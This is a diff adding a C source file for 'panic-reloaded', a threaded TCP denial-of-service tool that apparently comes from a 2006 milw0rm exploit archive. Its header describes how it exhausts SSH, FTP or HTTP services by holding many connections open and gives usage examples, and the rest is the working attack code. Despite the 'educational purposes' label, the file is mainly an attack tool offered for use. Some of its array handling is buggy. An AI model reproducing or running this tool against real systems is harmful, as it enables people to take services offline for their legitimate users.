@@ -1,0 +1,260 @@
+/* -----------------------------------------------------------------------------
+ *  ______________________________             __________
+ *  __  ____/_  __ \__  __/__  __/_____ ____  ____  /_  /_
+ *  _  / __ _  / / /_  /  __  /_ _  __  /  / / /_  /_  __/
+ *  / /_/ / / /_/ /_  /   _  __/ / /_/ // /_/ /_  / / /_
+ *  \____/  \____/ /_/    /_/    \__,_/ \__,_/ /_/  \__/
+ *                                   Security Community
+ *
+ * -----------------------------------------------------------------------------
+ * 
+ * Software for educational purposes
+ * 
+ * panic-reloaded.c written by hash <hash AT gotfault DOT net>
+ *			            <www.gotfault.net>
+ *
+ * Description: TCP Denial Of Service Tool. panic-reloaded does
+ * 		not require large link or fast internet connection,
+ * 		it creates many pthreads, leaving openned connections
+ * 		to victim host. It is fast and an efficient way to
+ * 		deny a TCP service.
+ *
+ * 		Tested against SSH, FTP, HTTP.
+ * 
+ * TTY1:
+ * hash@scarface:~$ gcc -lpthread panic-reloaded.c -o panic-reloaded -Wall
+ * hash@scarface:~$ ./panic-reloaded3 10.10.10.2 22 20 100 10
+ * panic-reloaded.c
+ * written by hash <http://gotfault.net>
+ * [!] Target: localhost:443
+ * [!] Threads: 20 for each round
+ * [*] Countdown: 40 | [!] Sleeping: 10s
+ *
+ * TTY2:
+ * hash@scarface:~$ ssh localhost 
+ * ssh_exchange_identification: Connection closed by remote host
+ * hash@scarface:~$
+ *
+ * 
+ * Greets to folks from gotfault, rfdslabs, tripbit 
+ * and to friends out there.
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <string.h>
+#include <netdb.h>
+#include <pthread.h>
+
+#define	AUTHOR		"written by hash <http://gotfault.net>"
+
+void usage(char*);
+void sockz(void*);
+void header();
+void close_func(void *); 
+char *resolver(char*);
+
+struct pthread_args {
+
+	char *host_pthread;
+	char *port_pthread;
+	char *slp_pthread;
+
+};struct pthread_args thread_data_array[1];
+
+struct pthread_close {
+	
+	char *slp_pthread;
+	int sock_pointer;
+	
+};struct pthread_close thread_data[0];
+
+void usage(char *progname) {
+
+	header();
+	printf("Use: %s host port threads rounds sleep_time\n",progname);
+	printf("host:		ip address or hostname\n");
+	printf("port:		victim port\n");
+	printf("threads:	number of threads\n");
+	printf("rounds:		number of reloads, min 40\n");
+	printf("sleep_time:	sleep time between each round\n");
+	exit(0);
+
+}
+
+void header() {
+	
+	printf("panic-reloaded.c\n");
+	printf("%s\n",AUTHOR);
+	
+}
+
+void close_func(void *c) {
+
+	struct pthread_close *my_close;
+	
+	char *slp_tmp;
+	int slp,
+	    err,
+	    sock_p;
+	
+	my_close = (struct pthread_close *) c;
+	slp_tmp = my_close->slp_pthread;
+	sock_p = my_close->sock_pointer;
+
+	slp = atoi(slp_tmp);
+
+	sleep(slp+1);
+
+	if((err = close(sock_p)) < 0) {
+		printf("close_func: Can`t close socket\n");
+		exit(-1);
+	}
+		
+	
+}
+
+void sockz(void *t) {
+
+        struct sockaddr_in dest;
+	struct pthread_args *my_data;
+	pthread_t close_them_all;
+	
+	char *h,
+	     *p_tmp,
+	     *slp_tmp;
+
+	int p,
+	    con,
+	    err,
+	    desc,
+	    slp;
+
+	my_data = (struct pthread_args *) t;
+
+	h = my_data->host_pthread;
+	p_tmp = my_data->port_pthread;
+	slp_tmp = my_data->slp_pthread;
+
+	p = atoi(p_tmp);
+	slp = atoi(slp_tmp);
+
+        desc = socket(AF_INET,SOCK_STREAM,0);
+       
+	if((desc = socket(AF_INET,SOCK_STREAM,0)) < 0) {
+                perror("sockz: Can`t create socket\n");
+                exit(-1);
+        }
+
+        dest.sin_family = AF_INET;
+        dest.sin_port = htons(p);
+        dest.sin_addr.s_addr = inet_addr(h);
+        bzero(&(dest.sin_zero),8);
+
+       	con = connect(desc,(struct sockaddr *)&dest,sizeof(dest));
+       
+	if(con < 0) {
+               	printf("\nsockz: Can`t connect to %s:%d\n",h,p);
+               	close(desc);
+               	exit(-1);
+       	}
+
+	thread_data[0].sock_pointer = desc;
+	thread_data[0].slp_pthread = slp_tmp;
+
+	if((err = pthread_create(&close_them_all,NULL,(void*)&close_func,\
+	(void*)&thread_data[0]) == -1)) {
+		printf("sockz: Can`t create thread\n");
+		exit(-1);
+	}
+
+}
+
+char *resolver(char *hosttmp){
+
+        struct hostent *h;
+
+        char *host;
+
+        h = gethostbyname(hosttmp);
+        
+	if(!h) {
+                printf("resolver: Can`t resolve hostname %s\n",hosttmp);
+                exit(-1);
+        }
+
+        host = inet_ntoa(*((struct in_addr *)h->h_addr_list[0]));
+
+        return host;
+}
+
+
+int main(int ac, char **av) {
+		
+	if(ac<6)
+		usage(av[0]);
+
+	int x,
+	    y,
+	    z,
+	    err;
+	
+	char *hosttmp,
+	     *port,
+	     *host,
+	     *slp;
+	
+	int sockets,
+	    rounds,
+	    slptime,
+	    countdown; 
+	
+	hosttmp = av[1];
+	port = av[2];
+	sockets = atoi(av[3]);
+	rounds = atoi(av[4]); countdown = rounds;
+	slp = av[5];
+	slptime = atoi(slp);
+
+	if(rounds<40)	
+		usage(av[0]);
+
+	host = resolver(hosttmp);
+
+	pthread_t threads[rounds];
+
+	header();
+	
+	printf("[!] Target: %s:%s\n",host,port);
+	printf("[!] Threads: %d for each round\n",sockets);
+
+	for(z=0;z<rounds;z++) {	
+		for(x=0;x<sockets;x++) {
+			thread_data_array[x].host_pthread = host;
+			thread_data_array[x].port_pthread = port;
+			thread_data_array[x].slp_pthread = slp;
+
+			if((err = pthread_create(&threads[x],NULL,(void*)&sockz,\
+			(void*)&thread_data_array[x])) == -1){
+				printf("main: Can`t create thread\n");
+				exit(-1);
+			}
+
+			for(y=0;y<sockets;y++)
+			pthread_join(threads[y],NULL);
+	
+		}
+		printf("[*] Countdown: %d | [!] Sleeping: %ds\n",countdown--,slptime);
+		sleep(slptime);
+	}
+	printf("Done!\n");	
+	
+	return 0;
+}
+/*oef*/
+
+// milw0rm.com [2006-04-13]
